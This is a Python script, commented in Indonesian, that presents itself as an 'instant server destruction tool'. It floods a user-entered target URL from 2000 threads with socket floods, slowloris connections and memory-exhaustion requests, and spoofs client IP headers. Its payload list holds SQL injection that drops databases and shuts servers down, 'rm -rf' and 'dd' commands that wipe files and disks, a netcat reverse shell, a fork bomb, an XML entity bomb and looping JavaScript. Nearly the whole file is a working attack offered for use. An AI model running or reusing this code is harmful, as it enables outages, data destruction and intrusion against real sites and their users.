import requests
import threading
import random
import time
import base64
import hashlib
import os
import json
import socket
import ssl
from urllib.parse import quote, urlparse, parse_qs
from datetime import datetime
import urllib3
import sys

# Disable semua warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class NuclearLFICrasher:
    def __init__(self, target_url):
        self.target_url = target_url
        self.attack_count = 0
        self.crash_count = 0
        self.start_time = None
        self.session = requests.Session()
        self.target_down = False
        
        # NUCLEAR PAYLOADS - Didesain untuk crash server
        self.nuclear_payloads = [
            # Memory Exhaustion Payloads (10-100MB)
            "A" * 10000000,  # 10MB
            "B" * 50000000,  # 50MB  
            "C" * 100000000, # 100MB
            "0" * 25000000,  # 25MB
            "1" * 75000000,  # 75MB
            
            # SQL Injection Nuclear
            f"' OR SLEEP({random.randint(30, 60)})--",
            "'; DROP DATABASE mysql--", 
            "' UNION SELECT @@version,LOAD_FILE('/etc/passwd'),BENCHMARK(100000000,MD5('nuke'))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(60)))a)--",
            "'; SHUTDOWN WITH NOWAIT--",
            
            # Command Injection Extreme
            "; rm -rf /var/www/html/*",
            "| mkfifo /tmp/pipe; cat /tmp/pipe | /bin/sh -i 2>&1 | nc 127.0.0.1 4444 > /tmp/pipe",
            "` dd if=/dev/zero of=/dev/sda bs=1M count=100 `",
            "; find / -name '*' -exec rm -rf {} \\;",
            "| while true; do curl -X POST http://localhost:80 -d @/dev/zero; done",
            
            # PHP Nuclear Commands
            "<?php system('kill -9 -1'); ?>",
            "<?php while(1) { file_get_contents('http://localhost/'); } ?>",
            "\\<?php exec('forkbomb(){ forkbomb|forkbomb& };forkbomb'); ?>",
            "<?php system('echo 1 > /proc/sys/kernel/panic'); ?>",
            "<?php system('mount -o remount,size=100T /tmp'); ?>",
            
            # Buffer Overflow Nuclear
            "%n" * 100000,
            "%s" * 500000, 
            "%x" * 1000000,
            "\x00" * 50000000,
            "\xFF" * 100000000,
            
            # Recursive Traversal Extreme
            "../../../../" * 5000,
            "....//" * 10000,
            "%2e%2e%2f" * 20000,
            "..%252f..%252f" * 1500,
            
            # XML Bomb
            "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"><!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"><!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"><!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"><!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"><!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">]><lolz>&lol9;</lolz>",
            
            # JavaScript Bomb
            "<script>while(true){window.open('http://localhost/')}</script>",
            "<script>setInterval(()=>{for(let i=0;i<1000;i++){fetch('http://localhost/')}},1)</script>",
            "<script>document.write('<img src=\"http://localhost/\" onerror=\"this.src=this.src\">'.repeat(10000))</script>",
            
            # JSON Bomb
            '{"data": "' + "X" * 5000000 + '"}',
            '["' + '","'.join(["A" * 10000] * 1000) + '"]',
            
            # Binary Data Bomb
            base64.b64encode(os.urandom(50000000)).decode(),
        ]

        # Extended parameter list untuk coverage maksimal
        self.common_parameters = [
            'file', 'page', 'path', 'filename', 'template', 'load', 'include',
            'doc', 'document', 'folder', 'style', 'pdf', 'redirect', 'url', 
            'next', 'target', 'src', 'menu', 'loc', 'view', 'content', 'display',
            'show', 'img', 'image', 'picture', 'layout', 'theme', 'skin', 'config',
            'setting', 'data', 'input', 'output', 'cmd', 'command', 'exec', 'system',
            'func', 'function', 'module', 'component', 'widget', 'block', 'part',
            'section', 'area', 'zone', 'panel', 'frame', 'window', 'site', 'website',
            'web', 'app', 'application', 'script', 'php', 'html', 'htm', 'jsp',
            'asp', 'aspx', 'cgi', 'pl', 'action', 'do', 'process', 'execute', 'run',
            'start', 'begin', 'open', 'read', 'write', 'create', 'make', 'build',
            'generate', 'get', 'post', 'put', 'delete', 'update', 'edit', 'modify',
            'admin', 'user', 'login', 'auth', 'password', 'pass', 'pwd', 'token',
            'key', 'secret', 'id', 'uid', 'userid', 'username', 'search', 'query',
            'q', 'find', 'lookup', 'filter', 'sort', 'order', 'category', 'type'
        ]

        # Enhanced headers dengan rotasi
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        ]

    def get_headers(self):
        """Get randomized headers dengan IP spoofing"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Client-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
        }

    def build_url(self, param, payload):
        """Build URL dengan parameter handling"""
        parsed = urlparse(self.target_url)
        query_params = parse_qs(parsed.query)
        
        if query_params:
            new_params = query_params.copy()
            new_params[param] = [payload]
            new_query = '&'.join([f"{k}={quote(str(v[0]), safe='')}" for k, v in new_params.items()])
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            return f"{self.target_url.rstrip('?&')}?{param}={quote(str(payload), safe='')}"

    def log_crash(self, method, param, payload, result):
        """Log setiap crash attempt"""
        try:
            with open("nuclear_crash.log", "a", encoding='utf-8') as f:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"[{timestamp}] {method} | {param} | {payload[:50]}... | {result}\n")
        except:
            pass

    def nuclear_http_attack(self, param, payload):
        """HTTP attack dengan payload nuclear"""
        try:
            url = self.build_url(param, payload)
            headers = self.get_headers()
            
            # Untuk payload besar, gunakan POST
            if len(str(payload)) > 1000000:
                response = self.session.post(
                    url,
                    data={'data': payload, 'attack_id': random.randint(1000,9999)},
                    headers=headers,
                    timeout=2,
                    verify=False,
                    allow_redirects=True
                )
            else:
                response = self.session.get(
                    url,
                    headers=headers,
                    timeout=2,
                    verify=False,
                    allow_redirects=True
                )
            
            self.attack_count += 1
            
            # Deteksi crash berdasarkan status code
            if response.status_code >= 500:
                self.crash_count += 1
                self.log_crash("HTTP", param, payload, f"Server Error {response.status_code}")
                print(f"💥 HTTP CRASH! Status: {response.status_code} | Param: {param}")
                return True
                
        except requests.exceptions.Timeout:
            self.crash_count += 1
            self.log_crash("HTTP", param, payload, "Timeout")
            print(f"⏰ HTTP TIMEOUT CRASH! | Param: {param}")
            return True
            
        except requests.exceptions.ConnectionError:
            self.crash_count += 1
            self.log_crash("HTTP", param, payload, "Connection Error")
            print(f"🔌 HTTP CONNECTION CRASH! | Param: {param}")
            return True
            
        except Exception as e:
            if "Max retries exceeded" in str(e) or "Connection aborted" in str(e):
                self.crash_count += 1
                self.log_crash("HTTP", param, payload, f"Network Error: {str(e)[:30]}")
                print(f"🌐 HTTP NETWORK CRASH! | Param: {param}")
                return True
                
        return False

    def socket_flood_attack(self):
        """Raw socket flood attack"""
        try:
            parsed = urlparse(self.target_url)
            domain = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            
            if port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=domain)
            
            s.connect((domain, port))
            
            # Kirim data random besar
            flood_data = random.randbytes(50000)  # 50KB data random
            s.send(flood_data)
            
            # Kirim HTTP request corrupted
            http_flood = f"GET /{random.randint(1000,9999)} HTTP/1.1\r\nHost: {domain}\r\n\r\n".encode()
            s.send(http_flood)
            s.send(random.randbytes(10000))
            
            s.close()
            self.attack_count += 1
            
        except:
            self.crash_count += 1
            print(f"🔌 SOCKET FLOOD CRASH!")
            return True
            
        return False

    def slowloris_attack(self):
        """Slowloris attack untuk exhaust connections"""
        try:
            parsed = urlparse(self.target_url)
            domain = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((domain, port))
            
            # Kirim partial headers
            s.send(f"POST /{random.randint(1000,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {domain}\r\n".encode())
            s.send("Content-Length: 1000000000\r\n".encode())  # 1GB content length
            
            # Pertahankan koneksi
            start = time.time()
            while time.time() - start < 30:  # Hold for 30 seconds
                s.send(f"X-{random.randint(1000,9999)}: {random.randint(1000,9999)}\r\n".encode())
                time.sleep(5)
                
            s.close()
            self.attack_count += 1
            
        except:
            self.crash_count += 1
            print(f"🐌 SLOWLORIS CRASH!")
            return True
            
        return False

    def memory_exhaustion_attack(self, param):
        """Serangan habiskan memory dengan payload massive"""
        try:
            # Generate payload 50-200MB
            huge_payload = "Z" * random.randint(50000000, 200000000)
            
            url = self.build_url(param, huge_payload[:1000000])  # Limit URL length
            headers = {**self.get_headers(), 'Content-Type': 'application/octet-stream'}
            
            # Gunakan POST untuk data besar
            response = self.session.post(
                url,
                data={'massive_data': huge_payload},
                headers=headers,
                timeout=3,
                verify=False
            )
            
            self.attack_count += 1
            print(f"💣 MEMORY BOMB: {len(huge_payload)} bytes sent!")
            
            if response.status_code >= 500:
                self.crash_count += 1
                return True
                
        except requests.exceptions.Timeout:
            self.crash_count += 1
            print(f"⏰ MEMORY BOMB TIMEOUT!")
            return True
        except requests.exceptions.ConnectionError:
            self.crash_count += 1
            print(f"🔌 MEMORY BOMB CONNECTION ERROR!")
            return True
        except Exception as e:
            if "Max retries" in str(e) or "Connection" in str(e):
                self.crash_count += 1
                return True
                
        return False

    def start_nuclear_attack(self, threads=2000, duration=60):
        """MEMULAI SERANGAN NUKLIR UNTUK CRASH SERVER"""
        print("☢️  NUCLEAR LFI CRASHER v2.0 - SERVER DESTRUCTION MODE")
        print(f"🎯 Target: {self.target_url}")
        print(f"💥 Threads: {threads} | ⏱️ Duration: {duration}s")
        print("🚨 MODE: INSTANT SERVER CRASH")
        print("=" * 70)
        
        self.start_time = time.time()
        stop_event = threading.Event()
        
        # Pre-check target status
        print("\n[PHASE 1] 🔍 Checking target status...")
        try:
            response = requests.get(self.target_url, timeout=5, verify=False)
            print(f"✅ Target aktif - Status: {response.status_code}")
        except:
            print("❌ Target mungkin sudah down atau tidak accessible")
        
        print("\n[PHASE 2] 💣 Launching nuclear attacks...")
        
        def nuclear_worker():
            while not stop_event.is_set() and (time.time() - self.start_time < duration):
                try:
                    param = random.choice(self.common_parameters)
                    payload = random.choice(self.nuclear_payloads)
                    
                    # Multiple attack vectors
                    attack_methods = [
                        lambda: self.nuclear_http_attack(param, payload),
                        self.socket_flood_attack,
                        self.slowloris_attack,
                        lambda: self.memory_exhaustion_attack(param)
                    ]
                    
                    # Jalankan 2-4 attack methods sekaligus
                    for method in random.sample(attack_methods, random.randint(2,4)):
                        if stop_event.is_set():
                            break
                        if method():
                            break
                            
                    time.sleep(0.01)  # Minimal delay untuk maximum RPS
                    
                except Exception as e:
                    continue

        # Start ALL threads sekaligus untuk maximum impact
        attack_threads = []
        for i in range(threads):
            t = threading.Thread(target=nuclear_worker, daemon=True)
            t.start()
            attack_threads.append(t)
            
            if i % 100 == 0:
                print(f"🚀 Launched {i} nuclear threads...")

        print(f"✅ ALL {threads} NUCLEAR THREADS DEPLOYED!")
        print("💀 SERVER DESTRUCTION IN PROGRESS...")
        
        # Real-time monitoring
        last_count = 0
        crash_detected = False
        
        for i in range(duration * 2):  # Check every 0.5 seconds
            if stop_event.is_set():
                break
                
            elapsed = time.time() - self.start_time
            if elapsed >= duration:
                break
                
            # Calculate RPS
            current_count = self.attack_count
            rps = (current_count - last_count) * 2
            last_count = current_count
            
            # Auto-stop jika banyak crash terdeteksi
            if self.crash_count >= 10 and not crash_detected:
                crash_detected = True
                print(f"\n🎯 SERVER CRASH CONFIRMED! {self.crash_count} crash events detected!")
                stop_event.set()
                break
            
            status = "💀 CRASHED!" if crash_detected else "☢️  NUKING"
            print(f"⏰ {int(elapsed)}s | Attacks: {self.attack_count} | RPS: {rps} | Crashes: {self.crash_count} | Status: {status}", end='\r')
            time.sleep(0.5)
        
        stop_event.set()
        time.sleep(2)
        
        # Final verification
        self.verify_target_status()
        self.show_nuclear_results()

    def verify_target_status(self):
        """Verifikasi final status target"""
        print("\n[PHASE 3] 🔍 Verifying target status...")
        
        try:
            response = requests.get(self.target_url, timeout=10, verify=False)
            if response.status_code == 200:
                print(f"❌ MASIH AKTIF - Target bertahan dari serangan")
                print(f"💡 Response time: {response.elapsed.total_seconds():.2f}s")
            else:
                print(f"⚠️  MERESPONS DENGAN ERROR - Status: {response.status_code}")
                
        except requests.exceptions.Timeout:
            print(f"✅ TARGET TIMEOUT - SERVER DOWN!")
            self.target_down = True
        except requests.exceptions.ConnectionError:
            print(f"✅ TARGET TIDAK BISA DIHUBUNGI - SERVER DOWN!")
            self.target_down = True
        except Exception as e:
            print(f"✅ TARGET ERROR - {str(e)}")
            self.target_down = True

    def show_nuclear_results(self):
        """Tampilkan hasil nuclear attack"""
        total_time = time.time() - self.start_time
        
        print(f"\n{'='*70}")
        print("☢️  NUCLEAR ATTACK RESULTS")
        print(f"{'='*70}")
        print(f"🎯 Target: {self.target_url}")
        print(f"⏱️ Total Time: {total_time:.2f}s")
        print(f"💥 Total Attacks: {self.attack_count:,}")
        print(f"📊 Attacks/Sec: {self.attack_count/max(1, total_time):.1f}")
        print(f"💀 Crash Events: {self.crash_count}")
        print(f"🎯 Final Status: {'✅ SERVER DOWN' if self.target_down else '❌ STILL ALIVE'}")
        
        if self.target_down:
            print(f"\n🎉 MISSION ACCOMPLISHED!")
            print(f"💀 Server successfully crashed in {total_time:.1f} seconds")
            print(f"☢️  Nuclear payloads delivered: {self.attack_count:,}")
        else:
            print(f"\n💡 SERVER BERTAHAN - Mungkin butuh:")
            print(f"   - Lebih banyak threads (2000+)")
            print(f"   - Durasi lebih lama (60-120 detik)")
            print(f"   - Kombinasi dengan DDoS tools lain")
        
        print(f"\n📁 Log file: nuclear_crash.log")
        print(f"{'='*70}")

def main():
    print("☢️  NUCLEAR LFI CRASHER v2.0")
    print("💀 INSTANT SERVER DESTRUCTION TOOL")
    print("=" * 70)
    
    target_url = input("🎯 Enter target URL: ").strip()
    if not target_url:
        print("❌ Please enter a target URL")
        return
        
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Hardcoded untuk maximum destruction
    threads = 2000
    duration = 60
    
    print(f"\n⚠️  EXTREME WARNING: NUCLEAR MODE ACTIVATED!")
    print(f"⚠️  This will CRASH the target server!")
    print(f"⚠️  Using {threads} THREADS for MAXIMUM DESTRUCTION!")
    print(f"⚠️  Duration: {duration} seconds")
    print(f"⚠️  You are RESPONSIBLE for any damage!")
    
    confirm = input("\n💀 Type 'NUKE' to confirm nuclear strike: ")
    if confirm.upper() != 'NUKE':
        print("❌ Nuclear strike cancelled")
        return

    # Launch nuclear attack
    crasher = NuclearLFICrasher(target_url)
    crasher.start_nuclear_attack(threads=threads, duration=duration)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⏹️ Program stopped by user")
    except Exception as e:
        print(f"\n💥 Critical error: {e}")